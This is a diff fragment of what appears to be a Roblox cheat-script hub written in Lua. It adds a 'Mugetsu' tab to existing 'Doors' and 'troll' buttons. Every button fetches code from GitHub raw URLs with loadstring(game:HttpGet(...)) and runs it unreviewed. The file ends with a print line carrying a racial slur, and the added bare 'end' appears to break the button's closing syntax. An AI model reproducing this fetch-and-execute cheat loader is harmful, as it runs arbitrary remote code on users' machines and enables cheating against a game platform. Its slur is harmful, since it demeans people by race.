@@ -267,9 +267,11 @@ Doors:NewButton("dxrkhub", "man_this_is_so_boring", function() loadstring(game:H
 end)
 
 troll:NewButton("freeze", "freesze", function() loadstring(game:HttpGet('https://raw.githubusercontent.com/creepstu/fuzzy-octo-giggle/main/Source'))()
+end
+local Mugetsu = Window:NewTab("Mugetsu")
+local Mugetsu = Mugetsu:NewSection("Mugetsu")
+Mugetsu:NewButton("Pm(its the name", "ButtonInfo", function()  loadstring(game:HttpGet("https://raw.githubusercontent.com/TrickyAH/Scripts/main/loader.lua"))()
 end)
-
-
 
 
 print("enjoy nigger skidders")
